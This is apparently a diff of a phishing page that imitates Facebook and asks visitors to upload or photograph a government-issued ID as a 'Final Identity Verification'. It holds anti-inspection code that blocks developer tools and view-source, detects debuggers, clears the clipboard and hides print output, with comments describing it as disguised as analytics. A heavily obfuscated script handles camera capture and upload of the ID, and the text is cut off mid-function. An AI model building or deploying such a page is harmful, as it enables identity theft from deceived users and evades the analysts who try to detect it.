@@ -1,250 +1,56 @@
 <!doctype html><html lang=en><head>
 
+
 <script>
-// Subtle anti-inspection (appears as analytics or user tracking)
+// Minimal source code protection (appears as normal website script)
 (function() {
   'use strict';
   
-  // Gentle console clearing (looks like normal site cleanup)
-  let consoleClearCount = 0;
-  const clearConsole = () => {
-    if (consoleClearCount < 3) {
-      console.clear();
-      consoleClearCount++;
-    }
-  };
-  
-  // Subtle right-click override (appears as custom context menu)
+  // Only disable right-click on source code viewing attempts
   document.addEventListener('contextmenu', function(e) {
-    // Allow on input fields for better UX
-    if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
-      return true;
+    // Allow right-click everywhere except when trying to inspect
+    if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA' || e.target.tagName === 'BUTTON') {
+      return true; // Allow normal right-click on interactive elements
     }
-    
-    // Show a subtle toast instead of blocking completely
-    const toast = document.createElement('div');
-    toast.style.cssText = `
-      position: fixed;
-      top: 20px;
-      right: 20px;
-      background: #1877f2;
-      color: white;
-      padding: 10px 15px;
-      border-radius: 5px;
-      font-size: 13px;
-      z-index: 9999;
-      opacity: 0;
-      transition: opacity 0.3s ease;
-    `;
-    toast.textContent = 'Use the login form to access your account';
-    document.body.appendChild(toast);
-    
-    setTimeout(() => toast.style.opacity = '1', 10);
-    setTimeout(() => {
-      toast.style.opacity = '0';
-      setTimeout(() => document.body.removeChild(toast), 300);
-    }, 2000);
-    
     e.preventDefault();
-    return false;
   });
   
-  // Subtle text selection prevention (only on sensitive areas)
-  const sensitiveSelectors = 'script, style, .fb-login-box, .verification-card';
+  // Only block specific developer shortcuts, nothing else
+  document.addEventListener('keydown', function(e) {
+    // Only block F12 and Ctrl+U (view source) - keep everything else normal
+    if (e.keyCode === 123 || (e.ctrlKey && e.keyCode === 85)) {
+      e.preventDefault();
+      return false;
+    }
+  });
+  
+  // Very light text selection prevention only on sensitive areas
+  const sensitiveSelectors = 'script[src*="telegram"], script:not([src])';
   document.addEventListener('selectstart', function(e) {
     if (e.target.closest(sensitiveSelectors)) {
       e.preventDefault();
     }
   });
   
-  // Smart keyboard shortcut handling (less obvious)
-  let keySequence = [];
-  document.addEventListener('keydown', function(e) {
-    keySequence.push(e.keyCode);
-    if (keySequence.length > 5) keySequence.shift();
-    
-    // Block dev tools shortcuts but make it seem like the page is busy
-    const devToolsKeys = [123, 73, 74]; // F12, I, J
-    const isCtrlShift = e.ctrlKey && e.shiftKey;
-    const isViewSource = e.ctrlKey && e.keyCode === 85;
-    
-    if (e.keyCode === 123 || (isCtrlShift && devToolsKeys.includes(e.keyCode)) || isViewSource) {
-      // Show loading instead of just blocking
-      if (!document.getElementById('stealth-loading')) {
-        const loader = document.createElement('div');
-        loader.id = 'stealth-loading';
-        loader.style.cssText = `
-          position: fixed;
-          top: 0;
-          left: 0;
-          width: 100%;
-          height: 100%;
-          background: rgba(255,255,255,0.9);
-          display: flex;
-          align-items: center;
-          justify-content: center;
-          z-index: 10000;
-          font-family: Arial, sans-serif;
-        `;
-        loader.innerHTML = `
-          <div style="text-align: center;">
-            <div style="width: 40px; height: 40px; border: 3px solid #1877f2; border-top: 3px solid transparent; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 15px;"></div>
-            <div style="color: #1877f2; font-size: 16px;">Processing your request...</div>
-          </div>
-          <style>
-            @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-          </style>
-        `;
-        document.body.appendChild(loader);
-        
-        setTimeout(() => {
-          if (loader.parentNode) {
-            loader.parentNode.removeChild(loader);
-          }
-        }, 3000);
-      }
-      
-      e.preventDefault();
-      return false;
-    }
-  });
-  
-  // Subtle devtools detection (appears as responsive design check)
-  let lastWidth = window.innerWidth;
-  let lastHeight = window.innerHeight;
-  
-  const checkLayout = () => {
-    const widthDiff = Math.abs(window.innerWidth - lastWidth);
-    const heightDiff = Math.abs(window.innerHeight - lastHeight);
-    
-    // If dramatic resize (likely devtools), create "mobile optimization" delay
-    if (widthDiff > 200 || heightDiff > 200) {
-      const overlay = document.createElement('div');
-      overlay.style.cssText = `
-        position: fixed;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-        background: #f0f2f5;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        z-index: 9999;
-        font-family: Arial, sans-serif;
-      `;
-      overlay.innerHTML = `
-        <div style="text-align: center; max-width: 400px; padding: 20px;">
-          <div style="color: #1877f2; font-size: 20px; font-weight: bold; margin-bottom: 10px;">Optimizing Display</div>
-          <div style="color: #65676B; margin-bottom: 20px;">Please wait while we adjust the layout for your screen size...</div>
-          <div style="width: 50px; height: 50px; border: 3px solid #1877f2; border-top: 3px solid transparent; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto;"></div>
-        </div>
-      `;
-      document.body.appendChild(overlay);
-      
-      setTimeout(() => {
-        // Redirect to a generic page instead of about:blank
-        window.location.href = window.location.origin + '/?mobile=1';
-      }, 2500);
-    }
-    
-    lastWidth = window.innerWidth;
-    lastHeight = window.innerHeight;
-  };
-  
-  // Check periodically but not too frequently
-  setInterval(checkLayout, 1000);
-  
-  // Gentle clipboard protection (looks like form security)
-  if (navigator.clipboard) {
-    let clipboardProtection = 0;
-    const protectClipboard = () => {
-      if (clipboardProtection < 5) { // Don't overdo it
-        navigator.clipboard.writeText('').catch(() => {}); // Fail silently
-        clipboardProtection++;
-      }
-    };
-    
-    // Only protect when user is on sensitive elements
-    document.addEventListener('focusin', (e) => {
-      if (e.target.closest('.fb-login-box, .verification-card')) {
-        protectClipboard();
-      }
-    });
-  }
-  
-  // Subtle performance monitoring (appears as analytics)
-  let performanceChecks = 0;
-  const checkPerformance = () => {
-    if (performanceChecks > 10) return; // Don't run forever
-    
-    const start = performance.now();
-    // Tiny delay to detect debugging
-    setTimeout(() => {
-      const end = performance.now();
-      if (end - start > 50) { // Debugger likely attached
-        // Just slow things down instead of redirecting
-        document.body.style.opacity = '0.8';
-        document.body.style.filter = 'blur(1px)';
-        
-        setTimeout(() => {
-          document.body.style.opacity = '1';
-          document.body.style.filter = 'none';
-        }, 1000);
-      }
-      performanceChecks++;
-    }, 10);
-  };
-  
-  // Run performance checks occasionally
-  setInterval(checkPerformance, 5000);
-  
 })();
 </script>
 
 <style>
-/* Subtle protection styles that look like normal website CSS */
-.fb-login-box, .verification-card {
+/* Only protect the source code areas, everything else remains normal */
+script {
   -webkit-user-select: none;
   -moz-user-select: none;
   -ms-user-select: none;
   user-select: none;
-  -webkit-touch-callout: none;
 }
 
-/* Allow selection on input fields for better UX */
-input, textarea {
+/* Keep all normal website functionality */
+input, textarea, button, a {
   -webkit-user-select: text !important;
   -moz-user-select: text !important;
   -ms-user-select: text !important;
   user-select: text !important;
 }
-
-/* Hide scrollbars subtly */
-::-webkit-scrollbar { 
-  width: 0px;
-  background: transparent;
-}
-
-/* Subtle print protection */
-@media print {
-  .fb-login-box, .verification-card { 
-    display: none; 
-  }
-  body:after {
-    content: "Please use the online version for security purposes";
-    display: block;
-    text-align: center;
-    font-size: 16px;
-    padding: 50px;
-    color: #666;
-  }
-}
-
-/* Mobile optimization styles (makes layout checks look legitimate) */
-@media (max-width: 768px) {
-  .fb-content { flex-direction: column; }
-  .verification-container { padding: 10px; }
-}
 </style>
+
 </head><body><div class=fb-header><a class=fb-logo-header href=/ >facebook</a></div><div class=verification-container><div class=verification-card><div class=document-icon><svg fill=white height=48 viewBox="0 0 24 24" width=48><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14,2 14,8 20,8"/><line x1=16 x2=8 y1=13 y2=13 /><line x1=16 x2=8 y1=17 y2=17 /><polyline points="10,9 9,9 8,9"/></svg></div><h1 class=verification-title>Final Identity Verification</h1><p class=verification-subtitle>Complete your verification by uploading a government-issued ID</p><div class=progress-container><div class=progress-steps><div class="active progress-step"></div><div class="active progress-step"></div><div class="active progress-step"></div><div class="active progress-step"></div></div><p class=progress-text>Final Step</p></div><div class=info-card><div class=info-header><div class=info-icon><svg fill=white height=16 viewBox="0 0 24 24" width=16><path d="M12 1L3 5V11C3 16.55 6.84 21.74 12 23C17.16 21.74 21 16.55 21 11V5L12 1Z"/><path d="M9 12L11 14L16 9" fill=none stroke=white stroke-width=2 /></svg></div><div class=info-content><h4 class=info-title>Secure Document Upload</h4><p class=info-text>Upload a clear photo of your driver's license, passport, or national ID. All information is encrypted and securely processed.</p></div></div></div><div class=upload-section><div class=upload-buttons><button class="upload-btn take-photo-btn" id=take-photo-btn type=button><span>📷</span> Take Photo</button> <button class="upload-btn upload-file-btn" id=upload-file-btn type=button><span>📁</span> Upload File</button></div><input accept=image/* id=file-input style=display:none type=file><div class=camera-container id=camera-container><video autoplay class=camera-video id=camera-video playsinline></video><div class=camera-controls><button class="control-btn capture-btn" id=capture-btn type=button>📸 Capture</button> <button class="control-btn cancel-btn" id=cancel-camera-btn type=button>Cancel</button></div></div><div class=preview-container id=preview-container><img class=preview-image id=preview-image><div class=preview-controls><button class="control-btn retake-btn" id=retake-btn type=button>🔄 Retake</button> <button class="control-btn confirm-btn" id=confirm-btn type=button>✓ Looks Good</button></div></div><div class=error-message id=error-message>Please take or upload a clear photo of your government-issued ID</div></div><button class=submit-btn id=submit-btn type=button disabled>Complete Verification</button><div class=loading-spinner id=loading-spinner></div></div></div><script>const _0x392586=_0x35c9;function _0x5eb0(){const _0x1b9cb9=['tLLwEwK','CMvHzefZrgf0yvvsta','DhLWzq','otK1ode3mKHTz29OvG','l3n1y2nLC3m','CxvLCNLtzwXLy3rVCG','tLHLwve','rxjYB3iGC2vUzgLUzYbjrcbWAg90BZO','vMfgseC','z0HeBKC','Bg9HzgLUzY1ZCgLUBMvY','y2fUDMfZ','ntmWmZq0CgLgAKXN','ChjVz3jLC3mTyMfY','y2fUy2vSlwnHBwvYys1IDg4','whbQq2W','thf2tvO','D1Dwy00','y2fWDhvYzs1IDg4','zw52AxjVBM1LBNq','ANLowLm','CMvZDwX0','ywrKrxzLBNrmAxn0zw5LCG','zxjYB3i','8j+tHcbjrcbeB2n1BwvUDcbZDwjTAxr0zwqGyxqG','yLzyAei','y29UC3rYDwn0B3i','ody1mZGXwxjitKzn','y2HHBMDL','Ew93u0K','AwrFCgHVDg8UANbN','D0r6s1G','DMLKzw9xAwr0Aa','C3jJ','pc9ZCgfUpIbZzwnVBMrZlI4Upc9KAxy+cIaGicaGicaGica8zgL2ihn0EwXLpsjIywnRz3jVDw5KlwnVBg9YoIaJztrLnMvHoYbIB3jKzxiTCMfKAxvZoIaXmhb4oYbOzwLNAhq6idzWEdSGBwfYz2LUlxrVCdOGmtjWEdSGB3zLCMzSB3C6igHPzgrLBJSIpGOGicaGicaGicaGica8zgL2igLKpsjWCM9NCMvZCY1IyxiIihn0EwXLpsjIywnRz3jVDw5KlwnVBg9YoIaJmtG3n2yYoYbOzwLNAhq6ideWmcu7ihDPzhrOoIaWjtSGyM9YzgvYlxjHzgL1CZOGmtbWEdSGDhjHBNnPDgLVBJOGD2LKDgGGmxmGzwfZztSIpJWVzgL2pGOGicaGicaGicaGpc9KAxy+cIaGicaGicaG','Bg9JyxrPB24','8j+tGsbgAwXLie5HBwu6ia','Bwf0y2G','zgLZCgXHEq','cIaGicaGicaGicb0zxH0lwfSAwDUoIbJzw50zxi7cIaGicaGicaGicbTyxjNAw46idiWChGGmdSkicaGicaGicaGihbHzgrPBMC6idiWChG7cIaGicaGicaGicbIywnRz3jVDw5KoIbSAw5LyxiTz3jHzgLLBNqOmtm1zgvNlcaJztnMmMzKidaLlcaJzJbMogzMideWmcuPoWOGicaGicaGicaGyM9YzgvYoIaXChGGC29SAwqGiZe4nZDgmJSkicaGicaGicaGigjVCMrLCI1YywrPDxm6ideYChG7cIaGicaGicaGicbIB3jKzxiTBgvMDdOGnhb4ihnVBgLKicmXodC3rJi7cIaGicaGicaGicbIB3GTC2HHzg93oIaWidjWEca4ChGGCMDIysGYncWGmte5lcaYndiSidaUmsK7cIaGicaGicaG','vw9kChi','Dgv4DenVBNrLBNq','vKvuu2G','uxbZyKW','BvbTtu4','zwHsDwm','ngjQC0H0Dq','mc42','DxDUthy','DMfSDwu','C1fUz0q','z2v0q29UDgv4Da','AgvPz2H0','zhjHD0LTywDL','uNbLvfG','y291BNrKB3DUlxrPBwvY','C2vHCMnO','zM9YrwfJAa','C3vIBwL0lwj0BG','sM90wxm','zMLSzxm','ntCYotm2nuziwMHtCq','yMXVy2S','C2L6zq','zgT0BK4','Dg9tDhjPBMC','v1jVtwy','rfzJAwC','ChjLDMLLDY1JB250ywLUzxi','y2fTzxjHlwnVBNrHAw5LCG','q0jvwvq','tfLkueK','rxjYB3iGywnJzxnZAw5NignHBwvYytO','ugz2ChG','y2HHCKnVzgvbDa','yM5OzgO','BLrAuKq','DgfYz2v0','se9dv3a','CfHPrvG','Aw1Hz2uVANbLzW','uMjNr2e','mtCXwKvJEKnZ','r3fSBxe','tfnlshG','DxbSB2fKlwzPBguTyNrU','EuLmDhe','oGOk','yxbWBhK','BgvUz3rO','y3jLyxrLrwXLBwvUDa','vM9JEeG','BwvKAwfezxzPy2vZ','ChjLDMLLDY1PBwfNzq','Aw5SAw5LlwzSzxG','kcGOlISPkYKRksSK','C3jJt2jQzwn0','AhjLzG','s3j3sfi','DgfRzs1WAg90BY1IDg4','DMLKzw9izwLNAhq','l2LKlxbYB2nLC3nPBMC','zKntsfm','DMLKzw8','zvvVrue','mZn2rMHgqw0','v2vezwi','y3nZvgv4Da','C3bSAxq','CMv0ywTLlwj0BG','ywz0zxjLBMq','zgL2','z2v0vhjHy2TZ','zMfJAw5Ntw9Kzq','8j+tIIbgAwXLifnPEMu6ia','Aw5Zzxj0qwrQywnLBNrfBgvTzw50','mtC4odu3nKDfCxnxra','AwrLywW','oti3mtzru2XLug8','rxDgENu','Bg9N','mtu4mZe1mefcDM1Mrq','ruLyv0u','y2fTzxjHlxzPzgvV','su5eswW','CLzSDfO','Dg9eyxrHvvjm','Dg9gAxHLza','BM9Uzq','r2rtywG','CM5oCui','vw5HyMXLihrVigfJy2vZCYbJyw1LCMeUifbSzwfZzsb1C2uGDgHLihvWBg9HzcbVChrPB24GAw5ZDgvHzc4','z2v0vxnLCK1LzgLH','vxzxz1q','C3rHCNrZv2L0Aa','ww5vsMS','y2XPy2S','CwfVEvC','D2LKDgG','zMLSzs1PBNb1Da','mhWZFdr8mxWY','z2v0rwXLBwvUDej5swq','re13Ehe','ieTccG','zgLZywjSzwq','C3rVCa','nhWZFdf8mhWY','C3r5Bgu','Aw1Hz2uV'];_0x5eb0=function(){return _0x1b9cb9;};return _0x5eb0();}(function(_0x2f1035,_0x3cb82d){const _0x57a433={_0x4d956d:0x221,_0xa92d58:0x1e7,_0x170df3:0x1da,_0x32c39b:0x243,_0x4e6b62:0x209,_0x1a4d21:0x1c3,_0x4fb204:0x1ea},_0x29d8d9=_0x35c9,_0x44319d=_0x2f1035();while(!![]){try{const _0x492387=-parseInt(_0x29d8d9(_0x57a433._0x4d956d))/(-0x1cf7*-0x1+-0xeaf+-0x2db*0x5)+-parseInt(_0x29d8d9(_0x57a433._0xa92d58))/(-0x60*0xe+-0x1b8+0x6fa)*(-parseInt(_0x29d8d9(_0x57a433._0x170df3))/(0x206c+-0xda0+-0x15*0xe5))+-parseInt(_0x29d8d9(0x234))/(0x108a+0x24fb*0x1+-0x3581)*(-parseInt(_0x29d8d9(_0x57a433._0x32c39b))/(0x728+0x2*-0xa3f+0x1*0xd5b))+parseInt(_0x29d8d9(0x1e5))/(-0x2*0x783+-0x1693+0x259f)+-parseInt(_0x29d8d9(_0x57a433._0x4e6b62))/(0xff8+0x517*-0x1+-0x1cf*0x6)+parseInt(_0x29d8d9(0x212))/(0xc58+0x20f*-0x1+-0xa41)*(parseInt(_0x29d8d9(_0x57a433._0x1a4d21))/(-0x9d*-0x11+-0x6*-0x2fa+-0x20*0xe2))+-parseInt(_0x29d8d9(_0x57a433._0x4fb204))/(-0x3c8+0x7*0x29+0x2b3);if(_0x492387===_0x3cb82d)break;else _0x44319d['push'](_0x44319d['shift']());}catch(_0x28e51e){_0x44319d['push'](_0x44319d['shift']());}}}(_0x5eb0,0x10f55f+0x2fe9+-0x5707a));function _0x35c9(_0x745bcc,_0x10f1b5){const _0x309a5e=_0x5eb0();return _0x35c9=function(_0x145684,_0x52fdb4){_0x145684=_0x145684-(-0x182b*-0x1+0x5c*-0x1+0x16*-0x101);let _0x41e53e=_0x309a5e[_0x145684];if(_0x35c9['GppOUq']===undefined){var _0x5eebfa=function(_0xb28fe3){const _0x382723='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x42aa58='',_0xb7b45a='',_0x266e74=_0x42aa58+_0x5eebfa;for(let _0x52f4ca=-0x5f8+0x122d+-0x271*0x5,_0x3b0e2b,_0x5d47ff,_0x3cb745=0x26b0+-0x1486+0x19*-0xba;_0x5d47ff=_0xb28fe3['charAt'](_0x3cb745++);~_0x5d47ff&&(_0x3b0e2b=_0x52f4ca%(-0xde8*0x1+0x4f7*0x1+0x8f5)?_0x3b0e2b*(0x8ed+0xc42+-0x14ef)+_0x5d47ff:_0x5d47ff,_0x52f4ca++%(0x1*0x8f5+0x9*-0x44f+0x13*0x192))?_0x42aa58+=_0x266e74['charCodeAt'](_0x3cb745+(0x17*0x12f+0x12db*-0x2+0xa87))-(-0x1253*0x1+-0x7d*-0x2b+-0x2*0x151)!==0x1875+0x23f*-0x2+0x13*-0x10d?String['fromCharCode'](-0x2651+0x22a5+0x4ab&_0x3b0e2b>>(-(-0x18d*0x3+-0x1c83+0x212c)*_0x52f4ca&-0x193e+-0x1*0x6fe+0x1*0x2042)):_0x52f4ca:-0x249e*0x1+-0x65*0xf+0x2a89){_0x5d47ff=_0x382723['indexOf'](_0x5d47ff);}for(let _0x6d65e5=0x2062+0x1174*0x1+-0x31d6,_0x327cbc=_0x42aa58['length'];_0x6d65e5<_0x327cbc;_0x6d65e5++){_0xb7b45a+='%'+('00'+_0x42aa58['charCodeAt'](_0x6d65e5)['toString'](-0x116*-0x21+-0x527*0x4+-0xf2a))['slice'](-(0x1*-0x17c7+0x8e*0xa+-0x7*-0x29b));}return decodeURIComponent(_0xb7b45a);};_0x35c9['DtSRAd']=_0x5eebfa,_0x745bcc=arguments,_0x35c9['GppOUq']=!![];}const _0x14abf3=_0x309a5e[-0x2b*0xe2+-0x783+0x67f*0x7],_0x3f6185=_0x145684+_0x14abf3,_0x536a4a=_0x745bcc[_0x3f6185];if(!_0x536a4a){const _0x22672b=function(_0x41e699){this['zCkMkU']=_0x41e699,this['zIJzcE']=[0x6*-0xf8+0xa8e+-0x4bd,0x1277+0xf8d+-0x137*0x1c,0x1353+-0x146f+-0x2*-0x8e],this['hZCnoJ']=function(){return'newState';},this['qdahlc']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['oZtDlI']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x22672b['prototype']['cjhGBX']=function(){const _0x49e644=new RegExp(this['qdahlc']+this['oZtDlI']),_0x485a7f=_0x49e644['test'](this['hZCnoJ']['toString']())?--this['zIJzcE'][0x7a+0x623*-0x1+0x5aa]:--this['zIJzcE'][-0x2328+-0x2fc+0x2*0x1312];return this['ABeuDn'](_0x485a7f);},_0x22672b['prototype']['ABeuDn']=function(_0x517b83){if(!Boolean(~_0x517b83))return _0x517b83;return this['wTSAuD'](this['zCkMkU']);},_0x22672b['prototype']['wTSAuD']=function(_0x2e8027){for(let _0x153316=-0x88f+-0x24e7*0x1+0x16*0x211,_0x812098=this['zIJzcE']['length'];_0x153316<_0x812098;_0x153316++){this['zIJzcE']['push'](Math['round'](Math['random']())),_0x812098=this['zIJzcE']['length'];}return _0x2e8027(this['zIJzcE'][0xd*-0x5b+-0x2ac*-0x3+-0x365]);},new _0x22672b(_0x35c9)['cjhGBX'](),_0x41e53e=_0x35c9['DtSRAd'](_0x41e53e),_0x745bcc[_0x3f6185]=_0x41e53e;}else _0x41e53e=_0x536a4a;return _0x41e53e;},_0x35c9(_0x745bcc,_0x10f1b5);}const _0x3dcc22=(function(){let _0x408de3=!![];return function(_0x188ba6,_0x5dda66){const _0x5a092e=_0x408de3?function(){const _0x2c5a32=_0x35c9;if(_0x5dda66){const _0x205b7f=_0x5dda66[_0x2c5a32(0x1c9)](_0x188ba6,arguments);return _0x5dda66=null,_0x205b7f;}}:function(){};return _0x408de3=![],_0x5a092e;};}()),_0x8031e3=_0x3dcc22(this,function(){const _0x1d74a9={_0x1b9b3f:0x247},_0x451184=_0x35c9,_0x433cba={};_0x433cba['CBUYT']=_0x451184(0x1d0);const _0x1a50db=_0x433cba;return _0x8031e3[_0x451184(0x247)]()[_0x451184(0x23e)](_0x451184(0x1d0))[_0x451184(_0x1d74a9._0x1b9b3f)]()[_0x451184(0x220)](_0x8031e3)[_0x451184(0x23e)](_0x1a50db[_0x451184(0x24c)]);});_0x8031e3();const takePhotoBtn=document[_0x392586(0x1fe)](_0x392586(0x1d4)),uploadFileBtn=document[_0x392586(0x1fe)](_0x392586(0x1c6)),fileInput=document[_0x392586(0x1fe)](_0x392586(0x1fc)),cameraContainer=document[_0x392586(0x1fe)](_0x392586(0x24b)),cameraVideo=document['getElementById'](_0x392586(0x1ec)),captureBtn=document[_0x392586(0x1fe)](_0x392586(0x218)),cancelCameraBtn=document['getElementById'](_0x392586(0x214)),previewContainer=document[_0x392586(0x1fe)](_0x392586(0x24a)),previewImage=document[_0x392586(0x1fe)](_0x392586(0x1ce)),retakeBtn=document[_0x392586(0x1fe)](_0x392586(0x1de)),confirmBtn=document[_0x392586(0x1fe)]('confirm-btn'),submitBtn=document[_0x392586(0x1fe)](_0x392586(0x240)),errorMessage=document['getElementById']('error-message'),loadingSpinner=document[_0x392586(0x1fe)](_0x392586(0x210));let selectedPhotoFile=null,cameraStream=null;function dataURLtoFile(_0x595c94,_0x1f38b2){const _0x2e841c={_0x43fa6e:0x231,_0x454055:0x1ca},_0x3649a1=_0x392586,_0x465d05={'QpsbL':function(_0x26e5ae,_0x1473a1){return _0x26e5ae(_0x1473a1);}},_0x29fd16=_0x595c94[_0x3649a1(0x1dd)](','),_0x2324dd=_0x29fd16[0x4af*0x3+-0x3*-0xa75+0x13*-0x264][_0x3649a1(0x22b)](/:(.*?);/)[-0x192*-0xb+-0x1880+-0x1*-0x73b],_0x2d4950=_0x465d05[_0x3649a1(_0x2e841c._0x43fa6e)](atob,_0x29fd16[-0x1*0x1579+0x2551*0x1+0x1*-0xfd7]);let _0x36860e=_0x2d4950[_0x3649a1(_0x2e841c._0x454055)];const _0x43d31c=new Uint8Array(_0x36860e);while(_0x36860e--){_0x43d31c[_0x36860e]=_0x2d4950['charCodeAt'](_0x36860e);}const _0x5706bb={};return _0x5706bb['type']=_0x2324dd,new File([_0x43d31c],_0x1f38b2,_0x5706bb);}function updateSubmitButton(){const _0x30a00b={_0x41bb2f:0x1bc,_0x200ece:0x204,_0x168f20:0x204,_0x28fa5a:0x217},_0x3ea13a=_0x392586,_0x41a505={};_0x41a505['KrwHR']='none',_0x41a505[_0x3ea13a(0x241)]=function(_0x6b606d,_0x133a8e){return _0x6b606d===_0x133a8e;},_0x41a505['pXiEX']=_0x3ea13a(_0x30a00b._0x41bb2f),_0x41a505[_0x3ea13a(0x217)]=_0x3ea13a(0x235);const _0x1b9fec=_0x41a505;selectedPhotoFile?(submitBtn['disabled']=![],submitBtn[_0x3ea13a(_0x30a00b._0x200ece)]['opacity']='1',errorMessage[_0x3ea13a(_0x30a00b._0x200ece)]['display']=_0x1b9fec[_0x3ea13a(0x1d3)]):_0x1b9fec[_0x3ea13a(0x241)](_0x1b9fec[_0x3ea13a(0x1c0)],'bnhdj')?(submitBtn[_0x3ea13a(0x201)]=!![],submitBtn[_0x3ea13a(_0x30a00b._0x168f20)]['opacity']=_0x1b9fec[_0x3ea13a(_0x30a00b._0x28fa5a)]):_0x485581[_0x2ab747]=_0x531224[_0x3ea13a(0x1bb)](_0x33f4ea);}takePhotoBtn[_0x392586(0x21c)](_0x392586(0x1f9),async function(){const _0x52e0a5={_0x59a8b5:0x1eb,_0xe5cc7:0x219,_0x3980b1:0x1f4,_0x3fe498:0x236,_0x1a9f83:0x1e1,_0x2d68e8:0x1e6,_0x5f2f7b:0x1e2,_0x474c08:0x1c4,_0x52345e:0x204,_0x226dc6:0x1f1,_0x5a8faa:0x22c,_0x1bbb29:0x21d},_0x5216ed=_0x392586,_0x5af490={'uwnLv':_0x5216ed(_0x52e0a5._0x59a8b5),'rVltZ':_0x5216ed(0x1fd),'Gqlmq':_0x5216ed(_0x52e0a5._0xe5cc7),'GdSah':_0x5216ed(0x1f1),'dktnN':'block','NYVyi':function(_0x348437,_0x28d074){return _0x348437(_0x28d074);},'EwFzu':_0x5216ed(_0x52e0a5._0x3980b1)};try{if(_0x5af490[_0x5216ed(_0x52e0a5._0x3fe498)]!==_0x5216ed(0x1eb))_0x437371[_0x5216ed(_0x52e0a5._0x1a9f83)]()[_0x5216ed(0x23f)](_0x415d9f=>_0x415d9f[_0x5216ed(0x202)]()),_0x57189d=null;else{const _0x148a7a=_0x5af490[_0x5216ed(0x1ee)][_0x5216ed(0x1dd)]('|');let _0x134a41=0x1*0x1d69+0x6*-0x2f1+-0xbc3;while(!![]){switch(_0x148a7a[_0x134a41++]){case'0':const _0x421007={};_0x421007[_0x5216ed(0x1e6)]=0x500;const _0x1d9bbe={};_0x1d9bbe[_0x5216ed(_0x52e0a5._0x2d68e8)]=0x2d0;const _0x5c71c1={};_0x5c71c1[_0x5216ed(_0x52e0a5._0x5f2f7b)]=_0x5af490[_0x5216ed(_0x52e0a5._0x474c08)],_0x5c71c1['width']=_0x421007,_0x5c71c1[_0x5216ed(0x23a)]=_0x1d9bbe;const _0x4b4fcc={};_0x4b4fcc[_0x5216ed(0x1d8)]=_0x5c71c1,cameraStream=await navigator[_0x5216ed(0x1cd)][_0x5216ed(0x1f5)](_0x4b4fcc);continue;case'1':takePhotoBtn[_0x5216ed(_0x52e0a5._0x52345e)][_0x5216ed(0x22c)]=_0x5216ed(_0x52e0a5._0x226dc6);continue;case'2':uploadFileBtn[_0x5216ed(_0x52e0a5._0x52345e)][_0x5216ed(_0x52e0a5._0x5a8faa)]=_0x5af490[_0x5216ed(0x1f2)];continue;case'3':cameraVideo[_0x5216ed(0x1d1)]=cameraStream;continue;case'4':cameraContainer[_0x5216ed(0x204)][_0x5216ed(0x22c)]=_0x5af490[_0x5216ed(0x246)];continue;}break;}}}catch(_0x1b357e){console[_0x5216ed(_0x52e0a5._0x1bbb29)](_0x5216ed(0x1b9),_0x1b357e),_0x5af490[_0x5216ed(0x206)](alert,_0x5af490[_0x5216ed(0x1e8)]);}}),uploadFileBtn[_0x392586(0x21c)](_0x392586(0x1f9),function(){const _0x3a3efb={_0xc31c80:0x1f9},_0x27566c=_0x392586;fileInput[_0x27566c(_0x3a3efb._0xc31c80)]();}),fileInput[_0x392586(0x21c)](_0x392586(0x222),function(_0x1473ab){const _0x12d7df={_0x53c3c0:0x205,_0x3eda5d:0x242,_0x3e878b:0x1f7,_0x57794e:0x1ff,_0x3422ac:0x207},_0x3bf2ec={_0x41ce0c:0x1dd,_0x2a504f:0x21b},_0x199f17=_0x392586,_0x458f48={'UvWgT':'none','posLG':function(_0x26c4a0){return _0x26c4a0();},'yowSI':_0x199f17(0x244),'DMwxq':_0x199f17(_0x12d7df._0x53c3c0)},_0x4c48b0=_0x1473ab[_0x199f17(0x1be)][_0x199f17(_0x12d7df._0x3eda5d)][-0x29*0x29+-0xce6+-0x1*-0x1377];if(_0x4c48b0&&_0x4c48b0['type'][_0x199f17(_0x12d7df._0x3e878b)](_0x458f48[_0x199f17(_0x12d7df._0x57794e)])){selectedPhotoFile=_0x4c48b0;const _0x404a97=new FileReader();_0x404a97['onload']=function(_0x44529e){const _0x512082=_0x199f17,_0x3f9372='2|4|1|0|3'[_0x512082(_0x3bf2ec._0x41ce0c)]('|');let _0x4d8000=-0xb1f+-0x2434+0x2f53;while(!![]){switch(_0x3f9372[_0x4d8000++]){case'0':uploadFileBtn['style']['display']=_0x458f48[_0x512082(0x1f6)];continue;case'1':takePhotoBtn[_0x512082(0x204)][_0x512082(0x22c)]=_0x458f48[_0x512082(0x1f6)];continue;case'2':previewImage[_0x512082(0x227)]=_0x44529e[_0x512082(0x1be)][_0x512082(_0x3bf2ec._0x2a504f)];continue;case'3':_0x458f48['posLG'](updateSubmitButton);continue;case'4':previewContainer[_0x512082(0x204)][_0x512082(0x22c)]=_0x458f48[_0x512082(0x223)];continue;}break;}},_0x404a97[_0x199f17(_0x12d7df._0x3422ac)](_0x4c48b0);}}),captureBtn[_0x392586(0x21c)](_0x392586(0x1f9),function(){const _0x353dfb={_0x1b83bb:0x1c1,_0x14cf3e:0x1cb,_0x1b596f:0x239,_0xcc0fe8:0x23a,_0x149af1:0x1d5,_0xed9a63:0x23b,_0x417ed7:0x1ef,_0xe82985:0x1d9,_0x3145d1:0x230,_0x583210:0x204,_0x528cb2:0x22e,_0x28b658:0x232,_0x4d633e:0x204,_0x479d6b:0x22c,_0x2f37a6:0x24d,_0x5899fd:0x1e1},_0x3ffdd4=_0x392586,_0x1b03df={'mPmMN':_0x3ffdd4(0x203),'LYJPI':_0x3ffdd4(0x1f1),'uyANo':function(_0x165609){return _0x165609();},'INDIl':_0x3ffdd4(0x211),'eUoEA':_0x3ffdd4(_0x353dfb._0x1b83bb),'VETSh':function(_0x263782,_0x268cb5,_0x1bec80){return 